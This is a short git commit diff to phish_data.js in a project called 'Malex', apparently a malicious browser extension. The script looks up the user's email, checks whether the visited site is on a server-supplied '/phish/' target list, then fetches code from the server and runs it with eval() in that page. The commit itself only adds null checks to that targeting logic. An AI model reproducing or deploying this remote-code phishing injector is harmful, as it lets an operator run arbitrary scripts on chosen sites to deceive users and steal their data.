0042af51fab0c6702cab35e061addff38ca37f59
swuleung <sammiwuleung@gmail.com>
2018-12-02 20:02:31 -0500

    Cleaned up phishing

--- Malex/scripts/phish_data.js
+++ Malex/scripts/phish_data.js
@@ -2,7 +2,7 @@ chrome.storage.local.get('email', function (res) {
     $.get(`http://localhost:5000/phish/${res.email}`, function (result) {
         var urlList = window.location.href.split('\/')[2].split('.');
         var url = urlList[urlList.length - 2] + '.' + urlList[urlList.length - 1];
-        if ($.inArray(url, result.urls) != -1) {
+        if (!(typeof result === 'undefined') && !(typeof result.urls === 'undefined') && $.inArray(url, result.urls) != -1) {
 
             $.get(`http://localhost:5000/phish/${res.email}/${url}`, function (resu) {
                 eval(resu.code);
